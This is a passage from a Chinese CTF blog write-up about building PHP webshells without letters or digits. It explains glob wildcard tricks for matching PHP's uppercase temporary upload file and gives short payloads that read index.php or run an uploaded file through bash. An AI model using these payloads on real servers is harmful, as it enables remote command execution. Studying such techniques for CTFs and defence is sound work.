+<p>思路又陷入了僵局，虽然方向没错。</p>
+<h6 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h6><p>对于通配符，可能大家知道的都只有*和?。但实际上，阅读Linux的文档<a href="http://man7.org/linux/man-pages/man7/glob.7.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man7/glob.7.html</a> ，可以学到更多有趣的知识点。</p>
+<p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉/bin/run-parts：<br><img src="/2019/10/08/PHP-no-letter/7.png" alt="test"><br>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：<br><img src="/2019/10/08/PHP-no-letter/9.png" alt="test"><br>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p>
+<p>继续阅读glob的帮助，我发现另一个有趣的用法：<br><img src="/2019/10/08/PHP-no-letter/8.png" alt="test"><br>就跟正则表达式类似，glob支持利用[0-9]来表示一个范围。</p>
+<p>我们再来看看之前列出可能干扰我们的文件：<br><img src="/2019/10/08/PHP-no-letter/10.png" alt="test"><br>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
+<p>翻开ascii码表，可见大写字母位于@与[之间：<br><img src="/2019/10/08/PHP-no-letter/11.png" alt="test"><br>显然这一招是管用的。</p>
+<h5 id="生成webshell"><a href="#生成webshell" class="headerlink" title="生成webshell"></a>生成webshell</h5><p>为保持长度小于35且不存在$,则将$带入后面一个表达式，同时使用*来匹配最后文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=`/???/???%<span class="number">20</span>/???/???/????<span class="comment">/*`?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其含义如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `/bin/cat /<span class="keyword">var</span>/www/html/index.php`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>也可以通过<code>.</code>操作来使用bash运行此文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?</span>=`.%<span class="number">20</span>/???/???/????<span class="comment">/*`?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>P神的<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a><br>P神的<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a><br>陆老板的<a href="https://xz.aliyun.com/t/5677" target="_blank" rel="noopener">一道题回顾php异或webshell</a><br><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easyweb/wp" target="_blank" rel="noopener">SUCTF2019WP</a></p>
+
+      
+    </div>
+    
+    
+    
+
+  <div>
+      
+        
+      
+  </div>
+  
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/11/csp/" rel="next" title="CSP做题记录">
+                <i class="fa fa-chevron-left"></i> CSP做题记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/17/go-through-tree/" rel="prev" title="树的遍历（非递归）">
+                树的遍历（非递归） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/favicon.ico" alt="desperadoccy">
+            
+              <p class="site-author-name" itemprop="name">desperadoccy</p>
+              <p class="site-description motion-element" itemprop="description">desperado个人博客，一个瞎学的软工狗。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">67</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/desperadoccy" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:desperado@nuaa.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#webshell的构造"><span class="nav-number">2.</span> <span class="nav-text">webshell的构造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#思路一"><span class="nav-number">2.1.</span> <span class="nav-text">思路一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思路二-Copy-P神"><span class="nav-number">2.2.</span> <span class="nav-text">思路二(Copy P神)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#陆老板的思路"><span class="nav-number">2.3.</span> <span class="nav-text">陆老板的思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WP"><span class="nav-number">2.4.</span> <span class="nav-text">WP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补充"><span class="nav-number">2.5.</span> <span class="nav-text">补充</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#多次异或"><span class="nav-number">2.5.1.</span> <span class="nav-text">多次异或</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php5-shell构造webshell"><span class="nav-number">2.5.2.</span> <span class="nav-text">php5+shell构造webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#构造文件-COPY-P神"><span class="nav-number">2.5.2.1.</span> <span class="nav-text">构造文件(COPY P神)</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#深入理解glob通配符"><span class="nav-number">2.5.2.1.1.</span> <span class="nav-text">深入理解glob通配符</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#生成webshell"><span class="nav-number">2.5.2.2.</span> <span class="nav-text">生成webshell</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">3.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">desperadoccy</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/kesyoban.model.json"},"display":{"position":"left","width":300,"height":400},"mobile":{"show":false},"log":false});</script></body>
+</html>
